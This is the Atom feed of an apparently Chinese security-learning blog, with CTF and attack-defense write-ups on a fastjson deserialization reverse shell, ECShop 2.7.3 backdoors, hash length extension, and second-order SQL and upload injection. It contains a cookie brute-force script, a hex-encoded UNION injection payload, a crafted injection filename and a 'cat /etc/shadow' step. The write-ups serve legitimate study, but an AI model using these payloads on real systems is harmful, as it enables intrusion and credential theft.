<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>lalala&#39;s blog</title>
  
  <subtitle>努力做一名白帽子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoururl.com/"/>
  <updated>2018-06-26T02:46:43.912Z</updated>
  <id>http://yoururl.com/</id>
  
  <author>
    <name>lalala</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ISCC2018线下赛总结</title>
    <link href="http://yoururl.com/2018/06/26/ISCC2018%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
    <id>http://yoururl.com/2018/06/26/ISCC2018线下赛总结/</id>
    <published>2018-06-25T17:22:00.000Z</published>
    <updated>2018-06-26T02:46:43.912Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><p>先拿自己靶机，攻下高地，进入公共区域攻防<br>这次比赛打得非常差，赛后又重新自己复现了一下，emmm大概是这个样子的<br>给了一个环境，是Tomcat，开了8080端口<br><img src="\images\pasted-57.png" alt="upload successful"></p><p>比赛信息是192.168.43.70/whatisyourname/，这里用到了<strong>fastjson反序列化漏洞</strong>，熟悉Java的同学应该能看出来(但我是真的看不出来（╯－＿－）╯╧╧ )<br><img src="\images\pasted-58.png" alt="upload successful"><br><br><br></p><h1 id="fastjson反序列化漏洞参考："><a href="#fastjson反序列化漏洞参考：" class="headerlink" title="fastjson反序列化漏洞参考："></a>fastjson反序列化漏洞参考：</h1><p><a href="https://blog.csdn.net/yaofeino1/article/details/76377080" target="_blank" rel="noopener">https://blog.csdn.net/yaofeino1/article/details/76377080</a><br><a href="https://github.com/iBearcat/Fastjson-Payload" target="_blank" rel="noopener">https://github.com/iBearcat/Fastjson-Payload</a><br><a href="https://github.com/shengqi158/fastjson-remote-code-execute-poc" target="_blank" rel="noopener">https://github.com/shengqi158/fastjson-remote-code-execute-poc</a><br><br><br><br></p><h1 id="环境源码下载"><a href="#环境源码下载" class="headerlink" title="环境源码下载"></a>环境源码下载</h1><p>通过github下载含有漏洞环境的web源代码<a href="https://raw.githubusercontent.com/yaofeifly/vulhub/master/fastjson/vuln/fastjson-1.0.war" target="_blank" rel="noopener">下载地址</a><br>直接将war包放到tomcat的webapp目录下，运行tomcat就行：<br><img src="\images\pasted-66.png" alt="upload successful"><br><br><br></p><h1 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h1><p>通过浏览器访问环境URL，利用burpsuite对数据包进行拦截，修改数据包发送方式并且插入POST数据<br><strong>{“name”:”feifei”,age:12}</strong> ，查看效果：<br><img src="\images\pasted-59.png" alt="upload successful"><br>然后根据参考文献找到Test.java文件<br>构造poc(<strong><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">反弹shell</a></strong>)，编译一下<br><img src="\images\pasted-60.png" alt="upload successful"><br>生成.class文件<br><img src="\images\pasted-61.png" alt="upload successful"><br>base64 encode一下<br><img src="\images\pasted-62.png" alt="upload successful"><br>替换name字段，post过去<br><img src="\images\pasted-63.png" alt="upload successful"><br>可以看到命令执行成功<br><img src="\images\pasted-64.png" alt="upload successful"><br>nc连接上执行命令<br><img src="\images\pasted-65.png" alt="upload successful"><br>然后就是执行主办方给的getflag命令就可以打了，当时不知道什么原因环境命令执行有时能成功有时不成功≡￣﹏￣≡<br>nc也死活连不上<br>说到底还是自己好菜，对基础的东西理解还是不扎实，还是要多总结多刷题以赛代练，希望自己能进步的快一点　&lt;(￣ c￣)y▂ξ</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;环境介绍&quot;&gt;&lt;a href=&quot;#环境介绍&quot; class=&quot;headerlink&quot; title=&quot;环境介绍&quot;&gt;&lt;/a&gt;环境介绍&lt;/h1&gt;&lt;p&gt;先拿自己靶机，攻下高地，进入公共区域攻防&lt;br&gt;这次比赛打得非常差，赛后又重新自己复现了一下，emmm大概是这个样子的&lt;br
      
    
    </summary>
    
      <category term="CTF" scheme="http://yoururl.com/categories/CTF/"/>
    
      <category term="AWD" scheme="http://yoururl.com/categories/CTF/AWD/"/>
    
    
      <category term="攻防" scheme="http://yoururl.com/tags/%E6%94%BB%E9%98%B2/"/>
    
      <category term="web" scheme="http://yoururl.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>第三届安恒杯线下赛总结</title>
    <link href="http://yoururl.com/2018/06/26/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%AE%89%E6%81%92%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93-1/"/>
    <id>http://yoururl.com/2018/06/26/第三届安恒杯线下赛总结-1/</id>
    <published>2018-06-25T16:03:00.000Z</published>
    <updated>2018-06-25T17:18:37.972Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;&emsp;这次比赛只有一道web环境，用的是ECShop V2.7.3<br><br>&emsp;&emsp;模式是AD攻防，规则很简单（虽然半天才搞明白 ￣﹏￣），让对方的极其请求<a href="http://10.0.1.2，并带上自己的token，即可获取flag" target="_blank" rel="noopener">http://10.0.1.2，并带上自己的token，即可获取flag</a>  <br><br></p><h1 id="poc1"><a href="#poc1" class="headerlink" title="poc1"></a>poc1</h1><p><strong>post方式</strong><br>文件url：<a href="http://10.50.%s.2/mobile/index.php" target="_blank" rel="noopener">http://10.50.%s.2/mobile/index.php</a><br>参数：url=<a href="http://10.0.1.2?token=RCNWBJXQ" target="_blank" rel="noopener">http://10.0.1.2?token=RCNWBJXQ</a><br><br></p><h1 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h1><p><strong>post方式</strong><br>文件url：<a href="http://10.50.33.2/mobile/index.php?m=default&amp;c=auction" target="_blank" rel="noopener">http://10.50.33.2/mobile/index.php?m=default&amp;c=auction</a><br>参数：1=phpinfo()<br><br></p><p><strong>提示线索1:</strong><br>mobile/themes/default/auction_list.dwt<br>这是一个预留后门，比较叼D盾扫不出来<br><strong>提示线索2:</strong><br>mobile/api/uc.php<br><br></p><h1 id="任意文件读取-poc-1"><a href="#任意文件读取-poc-1" class="headerlink" title="任意文件读取(poc 1)"></a>任意文件读取(poc 1)</h1><p>根据给出的poc1，我们快速去定位问题文件位置<br>我们从mobile入口文件入手<br>即：  mobile/index.php<br>查看内容<br><img src="\images\pasted-36.png" alt="upload successful"><br>跟踪文件 <img src="\images\pasted-37.png" alt="upload successful"><br>看到内容 <img src="\images\pasted-38.png" alt="upload successful"><br>跟踪apps/目录<br>可以发现3个文件夹 <img src="\images\pasted-39.png" alt="upload successful"><br>我们首先看到默认文件夹 <img src="\images\pasted-40.png" alt="upload successful"><br>此时又得到5个文件夹 <img src="\images\pasted-41.png" alt="upload successful"><br>从第一个common文件夹开始<br>可以看到insert.php中的一个函数 <img src="\images\pasted-42.png" alt="upload successful"><br>看到关键代码 <img src="\images\pasted-43.png" alt="upload successful"><br>其中 <img src="\images\pasted-44.png" alt="upload successful"><br>明显是一个任意文件读取<br>利用脚本： <img src="\images\pasted-45.png" alt="upload successful"><br><br><br></p><h1 id="一句话木马文件-poc-2"><a href="#一句话木马文件-poc-2" class="headerlink" title="一句话木马文件(poc 2)"></a>一句话木马文件(poc 2)</h1><p><strong>防守方法删除预留后门auction_list.dwt文件即可</strong><br>当时官方给出提示：auction_list.dwt文件!<br><a href="\images\pasted-46.png">upload successful</a><br>由于此文件用于渲染，直接将小马删除即可<br><br><br><br></p><h1 id="任意写文件"><a href="#任意写文件" class="headerlink" title="任意写文件"></a>任意写文件</h1><p><strong>防守方法改掉writesth函数名即可</strong><br>定位到mobile/api/uc.php<br>在action数组中发现了一些奇怪的东西<br><img src="\images\pasted-47.png" alt="upload successful"><br>最后一个writesth十分瞩目，一看就应该是主办方留下的功能，我们全局搜索这个writesth函数<br>不难发现以下关键代码：<br><img src="\images\pasted-48.png" alt="upload successful"><br>即：<br>文件名可控<br>文件内容可控<br>即可写入Webshell<br>我们测试<br><img src="\images\pasted-49.png" alt="upload successful"><br>运行即可发现我们当前目录下写入sky.php，内容为<img src="\images\pasted-50.png" alt="upload successful"><br>但是由于当时的环境里，只有data目录有可写全写，而我们默认路径为<br><img src="\images\pasted-51.png" alt="upload successful"><br>所以直接写可能无效，应该选择上跳，例如  ../data/sky.php<br><br><br><br></p><h1 id="ECShop-v2-7-3后台直接getshell"><a href="#ECShop-v2-7-3后台直接getshell" class="headerlink" title="ECShop v2.7.3后台直接getshell"></a><strong><a href="!http://www.haaker.cn/?p=6420">ECShop v2.7.3后台直接getshell</a></strong></h1><p><img src="\images\pasted-52.png" alt="upload successful"><br><img src="\images\pasted-53.png" alt="upload successful"><br><img src="\images\pasted-54.png" alt="upload successful"><br><img src="\images\pasted-55.png" alt="upload successful"><br>防守方法改掉后台密码即可（默认admin admin888）<br><br><br><br></p><h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><p>本次比赛还有一个漏洞就是ctf用户弱口令<br>cat /etc/shadow<br>得到ctf账户密码123456<br>就因为这个漏洞被dalao全场从头打到尾…</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&amp;emsp;&amp;emsp;这次比赛只有一道web环境，用的是ECShop V2.7.3&lt;br&gt;&lt;br&gt;&amp;emsp;&amp;emsp;模式是AD攻防，规则很简单（虽然半天才搞明白 ￣﹏￣），让对方的极其请求&lt;a href=&quot;http://10.0.1.2，并带上自己的token，即可
      
    
    </summary>
    
      <category term="CTF" scheme="http://yoururl.com/categories/CTF/"/>
    
      <category term="AWD" scheme="http://yoururl.com/categories/CTF/AWD/"/>
    
    
      <category term="攻防" scheme="http://yoururl.com/tags/%E6%94%BB%E9%98%B2/"/>
    
      <category term="web" scheme="http://yoururl.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>hash长度拓展攻击</title>
    <link href="http://yoururl.com/2018/05/08/hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <id>http://yoururl.com/2018/05/08/hash长度拓展攻击/</id>
    <published>2018-05-08T14:15:00.000Z</published>
    <updated>2018-06-26T07:23:13.302Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Hash-Length-Extension-Attack"><a href="#Hash-Length-Extension-Attack" class="headerlink" title="Hash Length Extension Attack"></a>Hash Length Extension Attack</h3><p>&emsp;&emsp;总体来说就是我们知道一个加盐的hash值，即使我们不知道盐的具体内容，但只要知道长度就可以随便伪造种带盐的hash（相当于我们控制了明密文）<br><br></p><h1 id="MD5加密原理"><a href="#MD5加密原理" class="headerlink" title="MD5加密原理"></a>MD5加密原理</h1><p>先介绍一下md5加密的原理<br><img src="\images\pasted-25.png" alt="upload successful"></p><p>个人理解: md5的过程可以分成<strong>填充</strong>和<strong>压缩</strong>的过程<br></p><ul><li>md5 padding(填充)<br>&emsp;&emsp;message padding<br>&emsp;&emsp;length%64=56(8位标识原始长度)<br>填充的时候，将会使用16进制数据：<br>&emsp;~1个\x80<br>&emsp;~N个\0x00      </li><li>md5 compress(压缩)<br>&emsp;&emsp;message padding length—–&gt;hash<br>&emsp;&emsp;length=N*64(bit)      —–&gt;length%64(bit)<br><br></li></ul><h2 id="md5-padding"><a href="#md5-padding" class="headerlink" title="md5 padding"></a>md5 padding</h2><p><em>例如我们把admin来hash一下:</em><br>admin  先hex编码-&gt;61646d696e<br>再填充80<br>不满64bit，填充到第56位（50个00）——为了保证信息的长度为N*64+56(字节)<br>最后数据表示位2800000000000000（8个字节）<br>最终结果为:</p><blockquote><p>61646d6968000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000<br><br></p></blockquote><p><strong>什么是Magic number (确定值)</strong><br>代码中的0x67452301L, 0xefcdab89L, 0x98badcfeL, 0x10325476L这4个初始化的number就被称为Magic number或者是md5 iv (md5向量)<br><br><br></p><h2 id="md5-compress"><a href="#md5-compress" class="headerlink" title="md5 compress"></a>md5 compress</h2><p>我们发现，无论输入多长的信息，计算出来的问就按hash长度都是固定的(md5有32字节)，这就是因为hash算法是一种压缩算法。<br>Hash设计的时候不要求还原，所以就尽可能的扩大信息对每一位hash值的印象。在计算中，也是通过对每组长度为64bit信息分组进行迭代运算实现的。<br>每一次迭代，都会利用一个初始值与本组中的原始信息做一个复杂的数学运算，而将生成的结果带入到下次的复杂运算中作为初始值<br><br><br>我们还是计算admin的md5值。因为不满64bit,所以padding之后也只有64个bit，也就需要计算一轮compress压缩算法。压缩算法完成后产生的心magic number为：<br>A=0x292f2321L<br>B=0xa7a5577aL<br>C=0xe4a8943L<br>D=0xc31f804aL<br>而md5的结果:<br><img src="\images\pasted-26.png" alt="upload successful"><br>我们发现其实就是这一轮结果的简单拼接（小端存储数据倒叙）<br><br></p><h1 id="hash长度拓展攻击"><a href="#hash长度拓展攻击" class="headerlink" title="hash长度拓展攻击"></a>hash长度拓展攻击</h1><p>其实只要知道三点就能后进行攻击：</p><ul><li>MD5(salt+message)的值</li><li>message内容</li><li>salt+message长度<br>这样就可以在不知道salt的具体内容下，计算出任意的md5(salt+message+padding+append)值<br>因为salt+message+padding内容是经过填充的，一定是N*64，所以这个部分刚好能完成N轮复杂运算。而他的结果，也就是md5(salt+message+padding)刚好是用来做下一轮运算，也就是m’+padding运算的初始向量。<br><img src="\images\pasted-27.png" alt="upload successful"></li></ul><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>逆向算法很简单</p><pre><code>def compute_magic_number(self, md5str):    self.A = struct.unpack(&quot;I&quot;, md5str[0:8].decode(&apos;hex&apos;))[0]    self.B = struct.unpack(&quot;I&quot;, md5str[8:16].decode(&apos;hex&apos;))[0]    self.C = struct.unpack(&quot;I&quot;, md5str[16:24].decode(&apos;hex&apos;))[0]    self.D = struct.unpack(&quot;I&quot;, md5str[24:32].decode(&apos;hex&apos;))[0]</code></pre><p>由它逆出A=0x292f2321L,B=0xa7a5577aL,C=0xe4a8943L,D=0xc31f804aL<br>根据这4个Magci number，再和扩展的字符串m’(此时的m’要进行padding，padding的长度是len(salt+message+padding+m’))进行md5 compress，最后的结果即md5(salt+message+padding+m’)<br>这样就完成了长度拓展攻击</p><h2 id="例题测试"><a href="#例题测试" class="headerlink" title="例题测试"></a>例题测试</h2><h3 id="实验吧-让我进去"><a href="#实验吧-让我进去" class="headerlink" title="实验吧-让我进去"></a>实验吧-让我进去</h3><p>抓包改source，Repeater过去发现源码</p><pre><code>$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security      $username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];if (!empty($_COOKIE[&quot;getmein&quot;])) {    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {            echo &quot;Congratulations! You are a registered user.\n&quot;;            die (&quot;The flag is &quot;. $flag);        }        else {            die (&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;);        }    }    else {        die (&quot;You are not an admin! LEAVE.&quot;);    }}setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[&quot;source&quot;])) {setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));}else {    if ($_COOKIE[&quot;source&quot;] != 0) {        echo &quot;&quot;; // This source code is outputted here    }}</code></pre><p>按照源码要求，cookie中要存在变量getmein，而且，要 $COOKIE[“getmein”] === md5($secret . urldecode($username . $password))<br>sample-hash是secret+adminadmin的MD5<br><img src="\images\pasted-67.png" alt="upload successful"><br>这里secret相当于盐，我们并不知道，但是我们知道它的长度是15，算上后面admin就是20。<br>数据是admin<br>签名（哈希值）是571580b26c65f306376d4f64e53cb5c7<br><img src="\images\pasted-68.png" alt="upload successful"><br>生成的hash是新的签名，设置到cookies的getmein里面<br>把\x换成%后post提交，得到flag<br><img src="\images\pasted-69.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Hash-Length-Extension-Attack&quot;&gt;&lt;a href=&quot;#Hash-Length-Extension-Attack&quot; class=&quot;headerlink&quot; title=&quot;Hash Length Extension Attack&quot;&gt;&lt;/a&gt;Ha
      
    
    </summary>
    
      <category term="CTF" scheme="http://yoururl.com/categories/CTF/"/>
    
      <category term="web" scheme="http://yoururl.com/categories/CTF/web/"/>
    
    
      <category term="web" scheme="http://yoururl.com/tags/web/"/>
    
      <category term="crypto" scheme="http://yoururl.com/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>蓝鲸笔记系统writeup</title>
    <link href="http://yoururl.com/2018/04/10/%E8%93%9D%E9%B2%B8%E7%AC%94%E8%AE%B0%E7%B3%BB%E7%BB%9Fwriteup/"/>
    <id>http://yoururl.com/2018/04/10/蓝鲸笔记系统writeup/</id>
    <published>2018-04-10T07:30:00.000Z</published>
    <updated>2018-04-10T07:50:35.917Z</updated>
    
    <content type="html"><![CDATA[<h4 id="蓝鲸笔记系统"><a href="#蓝鲸笔记系统" class="headerlink" title="蓝鲸笔记系统"></a>蓝鲸笔记系统</h4><p>给出一个login界面，url看上去似乎有问题<br><br><a href="http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=login" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=login</a><br><br>感觉像是有文件包含<br><br>随便尝试一下<a href="http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=index" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=index</a><br><br><img src="\images\pasted-0.png" alt="upload successful"><br>果然是文件包含。先随便注册一个账号进去看看，发现 hint:./dbinit.sql</p><p><img src="\images\pasted-4.png" alt="upload successful"><br>发现了flag字段，flag应该就是在数据库里面了</p><p>肯定是文件包含无疑了，相办法读源码</p><h5 id="利用php伪协议读源码："><a href="#利用php伪协议读源码：" class="headerlink" title="利用php伪协议读源码："></a>利用php伪协议读源码：</h5><p>php://filter/read=convert.base64-encode/resource=<br><img src="\images\pasted-5.png" alt="upload successful"><br>不让读，真尴尬</p><p>然后仔细看了看url，猜测这个front是文件夹名，login是文件名<br><a href="http://202.98.28.108:10013/7sghfe673jd3/front/index.php" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/front/index.php</a><br><img src="\images\pasted-6.png" alt="upload successful"><br><img src="\images\pasted-7.png" alt="upload successful"><br>还是拒绝访问…</p><p>猜测后台脚本是这样写的:<br><br>include($action.’/‘.$mode.’.php’)<br><br>require”$action.’/‘.$mode.’.php’”</p><p><img src="\images\pasted-8.png" alt="upload successful"><br>成功读出来了！！！<br><br>login不让读，但是审计index.php的源码时发现common.php，顺便把源码也down下来</p><h5 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h5><p>先看一下index.php，并没有发现什么东西<br>在common.php中发现一些定义的函数</p><p>御剑扫一下，发现/admin/login.php , /admin/index.php，把源码都down下来<br><br>在/admin/login.php中发现<br><img src="\images\pasted-9.png" alt="upload successful"></p><p>/admin/login.php,调用了set_login()函数</p><p><img src="\images\pasted-10.png" alt="upload successful"></p><p>/front/common.php中有set_login()函数的定义</p><p><img src="\images\pasted-11.png" alt="upload successful"></p><p><img src="\images\pasted-12.png" alt="upload successful"></p><p><img src="\images\pasted-13.png" alt="upload successful"></p><p><img src="\images\pasted-14.png" alt="upload successful"></p><p>来到<a href="http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login</a></p><p><img src="\images\pasted-15.png" alt="upload successful"><br>跟踪一下这几个函数，这里设置了cookies和session。可以看出来最后set_cookie的值是$uname|$endata<br>$uname是admin。则cookie是 admin|md5(SECURITY_KEY+admin) <br><br>SECURITY_KEY 是个随机数，每一位是从wh两个字母中随机出来的6位随机数</p><p>看一下后台登陆验证</p><p><img src="\images\pasted-16.png" alt="upload successful"><br>两个函数在common.php中</p><p><img src="\images\pasted-17.png" alt="upload successful"></p><p><img src="\images\pasted-18.png" alt="upload successful"><br>这里验证了userid和level，如果cookie验证失败，则返回false，level如果是0，也返回false。</p><p>但是如果我们没有登陆，直接来到/admin/index.php页面，而且绕过cookie的验证，那么userid和level的默认初始值都是null。在php中，<br>null!==False</p><blockquote><blockquote><p>True<br>null!=False<br>False<br>$null!==false是返回true的。所以只要我们能伪造cookie，就可以绕过验证。</p></blockquote></blockquote><h5 id="爆破cookie脚本"><a href="#爆破cookie脚本" class="headerlink" title="爆破cookie脚本"></a>爆破cookie脚本</h5><pre><code>import requestsimport hashlibimport randomimport stringfalse_tag = &quot;not login!&quot;url = &quot;http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=index&quot;url_csrf = &quot;http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login&quot;def rand_str(length):    return &apos;&apos;.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))def md5_encode(data):    hash = hashlib.md5()    hash.update((data + &quot;admin&quot;).encode())    return hash.hexdigest()key = []for x1 in [&quot;w&quot;,&quot;h&quot;]:    for x2 in [&quot;w&quot;,&quot;h&quot;]:        for x3 in [&quot;w&quot;,&quot;h&quot;]:            for x4 in [&quot;w&quot;,&quot;h&quot;]:                for x5 in [&quot;w&quot;,&quot;h&quot;]:                    for x6 in [&quot;w&quot;,&quot;h&quot;]:                        key.append(x1+x2+x3+x4+x5+x6)                        print keys = requests.Session()    s.headers = {        &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&apos;,        &apos;cookie&apos;: &apos;&apos;    }for x in key:       s.headers[&quot;cookie&quot;] = &quot;uid=admin%7C&quot;+md5_encode(x)#+&quot;;&quot;+&quot;PHPSESSID={}&quot;.format(rand_str(26))    s.headers[&quot;PHPSESSID&quot;] = rand_str(26)    print s.headers[&quot;cookie&quot;]    result = s.get(url)    #print result.content    if false_tag in result.content:        print &quot;NO&quot;,x    else:        print &quot;YES&quot;        print s.headers        print result.content        break</code></pre><p><img src="\images\pasted-19.png" alt="upload successful"></p><p>发现setpagenumu页面，down下来源码</p><p><img src="\images\pasted-20.png" alt="upload successful"></p><h5 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h5><p>发现post的page是用户可以输入<br>但是类型限制了纯数字，应该是没有办法注入</p><p>回去审计/admin/index.php</p><p><img src="\images\pasted-21.png" alt="upload successful"><br>发现数据库里查询的是$page_size,跟踪get_page_size(),</p><p><img src="\images\pasted-22.png" alt="upload successful"><br>get_page_size()函数返回num，也就是index里面的$page_size<br>感觉应该能注入，回去看数据库文件</p><p><img src="\images\pasted-23.png" alt="upload successful"><br>发现数据库里定义的page是varchar类型<br>标准的脚本代码与数据库类型不匹配<br>利用is_numeric()函数的漏洞(认为0x…是整数)，构造一个二次注入</p><p>数据库文件中可以看到一共有四个列</p><p><img src="\images\pasted-24.png" alt="upload successful"><br>构造注入语句<br>2 union select 1,flag,flag,4 from flags<br>转成十六进制注入即可拿到flag<br>0x3220756e696f6e2073656c65637420312c666c61672c666c61672c342066726f6d20666c616773</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;蓝鲸笔记系统&quot;&gt;&lt;a href=&quot;#蓝鲸笔记系统&quot; class=&quot;headerlink&quot; title=&quot;蓝鲸笔记系统&quot;&gt;&lt;/a&gt;蓝鲸笔记系统&lt;/h4&gt;&lt;p&gt;给出一个login界面，url看上去似乎有问题&lt;br&gt;&lt;br&gt;&lt;a href=&quot;http://202.98.
      
    
    </summary>
    
      <category term="CTF" scheme="http://yoururl.com/categories/CTF/"/>
    
      <category term="web" scheme="http://yoururl.com/categories/CTF/web/"/>
    
    
      <category term="代码审计" scheme="http://yoururl.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="二次注入" scheme="http://yoururl.com/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
    
      <category term="php函数漏洞" scheme="http://yoururl.com/tags/php%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="php伪协议" scheme="http://yoururl.com/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    
      <category term="CSRF" scheme="http://yoururl.com/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>文件管理系统writeup</title>
    <link href="http://yoururl.com/2018/04/08/day1%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
    <id>http://yoururl.com/2018/04/08/day1文件管理系统/</id>
    <published>2018-04-08T12:11:00.000Z</published>
    <updated>2018-04-10T07:52:33.587Z</updated>
    
    <content type="html"><![CDATA[<h3 id="文件上传之代码审计"><a href="#文件上传之代码审计" class="headerlink" title="文件上传之代码审计"></a>文件上传之代码审计</h3><p>前几天做了一道有趣的web题，涉及到文件上传，代码审计，二次注入。</p><p>首先是一个文件管理系统，上传文件，重命名文件，删除文件的功能。也给出了网站源码。<img src="\images\pasted-1.png" alt="upload successful"><br>先审计代码，看一下upload.php<br><img src="\images\pasted-2.png" alt="upload successful"><br>文件上传函数，先看服务器怎么检查文件的，可以看到$pat_part[“extension”]不允许php上传<br>其中文件名 也被addslashes函数过滤，转义了一些字符，因此这里应该不存在注入</p><p>文件名存在数据库两个字段中，一个是filename（文件名），一个是extension（后缀名）</p><p>可以看出来文件名走过的流程是：<br>$file[‘name’]—&gt;pathinfo()—&gt;$path_part[‘filename’]—&gt;addslashes()—&gt;insert</p><p>再看一下rename.php<br><img src="\images\pasted-3.png" alt="upload successful"><br>首先查询文件名，如果存在，执行sql语句<br>根据$req[‘filename’]从数据库里查询到已存在的一行，并调用update语句进行修改</p><p>但在这里{oldname=[‘filename’]}将从数据库里查出的$result[‘filename’]再一次入库，结果造成一个二次注入</p><p>如果我们可以插入让extension的值为空，再把文件名在改名为.php就可以解析了</p><p>那么思路很明确，我们上传一个有恶意字段的jpg文件，然后rename进数据库，让后缀名变为空，然后再上传一个木马文件，由于extension为空，所以再次修改的时候不会加上.jpg的扩展名。</p><h5 id="解题步骤："><a href="#解题步骤：" class="headerlink" title="解题步骤："></a>解题步骤：</h5><blockquote><ul><li>上传文件名为’,extension=’’,filename=’aa.jpg.jpg</li><li>这样filename的值为’,extension=’’,filename=’aa.jpg</li><li>我们重命名把’,extension=’’,filename=’aa.jpg改为aa.jpg</li><li>这时我们再次上传一个写有木马的文件，文件名为aa.jpg</li><li>此时不会提示file is exists 因为extension!=jpg</li><li>将aa.jpg改为aa.php即可</li></ul></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;文件上传之代码审计&quot;&gt;&lt;a href=&quot;#文件上传之代码审计&quot; class=&quot;headerlink&quot; title=&quot;文件上传之代码审计&quot;&gt;&lt;/a&gt;文件上传之代码审计&lt;/h3&gt;&lt;p&gt;前几天做了一道有趣的web题，涉及到文件上传，代码审计，二次注入。&lt;/p&gt;
&lt;p&gt;首
      
    
    </summary>
    
      <category term="CTF" scheme="http://yoururl.com/categories/CTF/"/>
    
      <category term="web" scheme="http://yoururl.com/categories/CTF/web/"/>
    
    
      <category term="文件上传" scheme="http://yoururl.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
      <category term="代码审计" scheme="http://yoururl.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="二次注入" scheme="http://yoururl.com/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoururl.com/2018/04/07/hello-world/"/>
    <id>http://yoururl.com/2018/04/07/hello-world/</id>
    <published>2018-04-07T09:41:00.000Z</published>
    <updated>2018-06-26T02:48:37.977Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td 